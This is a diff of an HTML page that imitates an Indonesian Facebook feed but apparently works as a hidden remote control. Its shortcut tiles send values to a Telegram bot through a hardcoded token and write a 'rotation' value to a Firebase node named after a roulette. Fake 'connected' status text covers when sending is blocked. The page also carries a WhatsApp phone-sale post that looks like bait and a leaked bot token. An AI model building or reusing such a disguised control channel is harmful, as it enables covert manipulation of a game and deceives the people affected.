@@ -8,46 +8,44 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
-        body { background: #18191a; color: #e4e6eb; overflow-x: hidden; }
+        body { background: #18191a; color: #e4e6eb; }
 
         /* --- HEADER & NAV --- */
-        .header { background: #242526; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .header { background: #242526; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #3e4042; }
         .nav-primary { display: flex; justify-content: space-around; background: #242526; border-bottom: 1px solid #3e4042; position: sticky; top: 48px; z-index: 99; }
-        .nav-icon { font-size: 24px; padding: 12px; cursor: pointer; width: 16%; text-align: center; color: #b0b3b8; }
+        .nav-icon { font-size: 22px; padding: 12px; cursor: pointer; width: 16%; text-align: center; color: #b0b3b8; }
         .nav-icon:active { color: #1877f2; }
 
-        /* --- POST BOX (RANDOM) --- */
+        /* --- POST BAR --- */
         .post-bar { background: #242526; padding: 12px; display: flex; align-items: center; gap: 10px; margin-top: 8px; }
-        .avatar-circle { width: 40px; height: 40px; background: #4e4f50; border-radius: 50%; overflow: hidden; }
-        .avatar-circle img { width: 100%; height: 100%; object-fit: cover; }
-        .search-fake { background: #3a3b3c; flex: 1; padding: 10px 15px; border-radius: 20px; color: #b0b3b8; font-size: 14px; cursor: pointer; }
+        .avatar { width: 38px; height: 38px; background: #4e4f50; border-radius: 50%; overflow: hidden; }
+        .avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .search-fake { background: #3a3b3c; flex: 1; padding: 9px 15px; border-radius: 20px; color: #b0b3b8; font-size: 14px; cursor: pointer; }
 
-        /* --- SYSTEM STATUS (FAKE CONNECTED) --- */
-        .system-status-card { background: #1c1e21; border-top: 2px solid #1877f2; padding: 12px; margin-top: 10px; }
-        .sys-title { font-size: 11px; font-weight: bold; color: #1877f2; margin-bottom: 5px; }
-        .sys-info { font-size: 10px; color: #b0b3b8; font-family: monospace; line-height: 1.4; }
+        /* --- SYSTEM STATUS --- */
+        .system-status-card { background: #1c1e21; border-top: 2px solid #1877f2; padding: 12px; margin-top: 8px; font-size: 11px; }
+        .sys-info { font-family: monospace; color: #b0b3b8; }
 
-        /* --- VIDEO FEED CARD --- */
+        /* --- FEED CARD --- */
         .feed-card { background: #242526; margin-top: 10px; padding: 12px; border-bottom: 1px solid #3e4042; }
-        .feed-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .feed-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
         .profile-name { font-weight: bold; font-size: 14px; }
-        .feed-time { font-size: 11px; color: #b0b3b8; }
+        .feed-time { font-size: 12px; color: #b0b3b8; }
         .feed-text { font-size: 14px; line-height: 1.4; margin-bottom: 12px; }
+        .media-box { width: 100%; border-radius: 8px; overflow: hidden; background: #000; margin-top: 5px; }
+        .media-box img, .media-box video { width: 100%; display: block; }
 
-        /* CONTAINER VIDEO */
-        .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 8px; overflow: hidden; }
-        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
-
-        /* --- SHORTCUT GRID (7-12) --- */
-        .shortcut-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 12px; background: #242526; margin-top: 10px; }
-        .shortcut-item { background: #3a3b3c; padding: 12px 5px; border-radius: 8px; text-align: center; cursor: pointer; }
+        /* --- BUTTONS --- */
+        .btn-wa { display: block; width: 100%; padding: 10px; background: #25d366; color: white; text-align: center; text-decoration: none; border-radius: 6px; font-weight: bold; margin-top: 10px; font-size: 14px; }
+        .shortcut-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 12px; background: #242526; }
+        .shortcut-item { background: #3a3b3c; padding: 12px 5px; border-radius: 8px; text-align: center; cursor: pointer; font-size: 11px; font-weight: bold; }
     </style>
 </head>
 <body onmousedown="resetTimer()">
 
     <div id="fb-remote">
         <div class="header">
-            <div style="color:#fff; font-size: 24px; font-weight: bold;">facebook</div>
+            <div style="color:#fff; font-size: 22px; font-weight: bold;">facebook</div>
             <div style="display: flex; gap: 15px; font-size: 18px;">🔍 💬</div>
         </div>
 
@@ -61,82 +59,133 @@
         </div>
 
         <div class="post-bar">
-            <div class="avatar-circle"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+            <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
             <div class="search-fake" onclick="sendCmd(null, 'RANDOM')">Apa yang Anda pikirkan?</div>
         </div>
 
         <div class="system-status-card">
-            <div class="sys-title">SECURITY & SYSTEM SYNC</div>
+            <div style="color:#1877f2; font-weight:bold; margin-bottom:5px;">SECURITY & SYSTEM SYNC</div>
             <div class="sys-info">
-                Node: <span id="node-val">ID_STABLE</span><br>
-                Payload: <span id="payload-val">READY</span><br>
+                Node: <span id="node-val">ID_STABLE</span> | Payload: <span id="payload-val">READY</span><br>
                 Status: <span id="sync-val" style="color:#42b72a">CONNECTED</span>
             </div>
         </div>
 
         <div class="feed-card">
             <div class="feed-header">
-                <div class="avatar-circle"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
-                <div>
-                    <div class="profile-name">Video Rekomendasi</div>
-                    <div class="feed-time">Just now • 🌎</div>
-                </div>
+                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+                <div><div class="profile-name">Video Lucu Dunia</div><div class="feed-time">12 mnt • 🌎</div></div>
             </div>
-            <div class="feed-text">Tonton video menarik hari ini. Jangan lupa like dan share! #facebookvideo</div>
-            
-            <div class="video-container">
-                <iframe src="https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2Fshare%2Fv%2F177dwyFayA%2F&show_text=false&width=560&autoplay=1" 
-                    scrolling="no" frameborder="0" allowfullscreen="true" 
-                    allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share">
-                </iframe>
+            <div class="feed-text">Coba lihat aksi menggemaskan ini! 😍 #lucu #viral</div>
+            <div class="media-box">
+                <video controls muted loop><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></video>
             </div>
         </div>
 
         <div class="shortcut-grid">
-            <div class="shortcut-item" onclick="sendCmd(7, 'REELS')">🎞️ <span style="font-size:10px; display:block;">Reels</span></div>
-            <div class="shortcut-item" onclick="sendCmd(8, 'LIVE')">🎥 <span style="font-size:10px; display:block;">Live</span></div>
-            <div class="shortcut-item" onclick="sendCmd(9, 'PHOTO')">🖼️ <span style="font-size:10px; display:block;">Foto</span></div>
-            <div class="shortcut-item" onclick="sendCmd(10, 'EVENT')">📅 <span style="font-size:10px; display:block;">Acara</span></div>
-            <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖 <span style="font-size:10px; display:block;">Simpan</span></div>
-            <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️ <span style="font-size:10px; display:block;">Kencan</span></div>
+            <div class="shortcut-item" onclick="sendCmd(7, 'REELS')">🎞️<br>Reels</div>
+            <div class="shortcut-item" onclick="sendCmd(8, 'LIVE')">🎥<br>Live</div>
+            <div class="shortcut-item" onclick="sendCmd(9, 'PHOTO')">🖼️<br>Foto</div>
+            <div class="shortcut-item" onclick="sendCmd(10, 'EVENT')">📅<br>Acara</div>
+            <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖<br>Simpan</div>
+            <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️<br>Kencan</div>
         </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#cc0000"></div>
+                <div><div class="profile-name">Jual Beli HP Second</div><div class="feed-time">32 mnt • 🌎</div></div>
+            </div>
+            <div class="feed-text">Promo cuci gudang! iPhone 11 Pro Max mulus, nominus. Harga nego sampai jadi. Minat? Klik tombol WA di bawah!</div>
+            <div class="media-box">
+                <img src="https://i.ibb.co/Y3mX0vK/loker-indo.jpg">
+            </div>
+            <a href="https://wa.me/628156678087" class="btn-wa">Chat Penjual (WhatsApp)</a>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#0044ff"></div>
+                <div><div class="profile-name">Teknologi Masa Depan</div><div class="feed-time">1 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Eksperimen sains yang luar biasa. Jangan lupa subscribe!</div>
+            <div class="media-box">
+                <video controls muted loop><source src="https://www.w3schools.com/html/horse.mp4" type="video/mp4"></video>
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#ffaa00"></div>
+                <div><div class="profile-name">Wisata Kuliner</div><div class="feed-time">2 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Rekomendasi tempat makan enak di akhir pekan. Viewnya keren banget!</div>
+            <div class="media-box">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?auto=format&fit=crop&w=500&q=60">
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+                <div><div class="profile-name">Trending Video</div><div class="feed-time">4 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Video yang lagi ramai diperbincangkan di sosmed.</div>
+            <div style="position:relative; padding-bottom:56.25%; height:0; overflow:hidden; border-radius:8px; background:#000;">
+                <iframe src="https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2Fshare%2Fv%2F177dwyFayA%2F&show_text=false&width=560" style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#32cd32"></div>
+                <div><div class="profile-name">Info Kesehatan</div><div class="feed-time">5 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Tips menjaga imunitas tubuh di musim hujan. Silahkan bagikan ke keluarga tercinta.</div>
+            <div class="media-box">
+                <img src="https://images.unsplash.com/photo-1498837167922-ddd27525d352?auto=format&fit=crop&w=500&q=60">
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+                <div><div class="profile-name">Movie Trailer</div><div class="feed-time">7 jam • 🌎</div></div>
+            </div>
+            <div class="media-box">
+                <video controls muted loop><source src="http://techslides.com/demos/sample-videos/small.mp4" type="video/mp4"></video>
+            </div>
+        </div>
+
+        <div style="text-align:center; padding:20px; color:#888; font-size:12px;">Tidak ada postingan lagi.</div>
     </div>
 
     <script>
         let dbRef = null;
         let logoutTimer;
-        let isAdminLocked = false; 
+        let isAdminLocked = false;
 
-        // Inisialisasi Firebase
         const config = { databaseURL: "https://roullete-fc17f-default-rtdb.asia-southeast1.firebasedatabase.app/" };
         if (!firebase.apps.length) firebase.initializeApp(config);
         dbRef = firebase.database().ref('control');
 
-        // Monitoring Lock (Tanpa merubah teks UI)
         dbRef.on('value', (s) => {
             const d = s.val();
-            if (d && (d.clientA_status === "OFF" || d.app_status === "OFF")) {
-                isAdminLocked = true;
-            } else {
-                isAdminLocked = false;
-            }
+            isAdminLocked = (d && (d.clientA_status === "OFF" || d.app_status === "OFF"));
         });
 
         function sendCmd(id, label) {
             let val = (id === null) ? "RANDOM" : (12 - id).toFixed(1);
-            
-            // UI Feedback (Seolah-olah aktif)
             document.getElementById("node-val").innerText = "ID_" + label;
             document.getElementById("payload-val").innerText = val;
             document.getElementById("sync-val").innerText = "SENDING...";
 
             if (isAdminLocked) {
                 setTimeout(() => { document.getElementById("sync-val").innerText = "CONNECTED"; }, 800);
-                return; // Berhenti jika OFF di admin
+                return;
             }
 
-            // Jalankan Perintah
-            fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_VIDEO_LOG:${label}_Val:${val}`);
+            fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_LOG:${label}_Val:${val}`);
             
             if(dbRef) {
                 dbRef.update({ rotation: val, last_click: Date.now() }).then(() => {
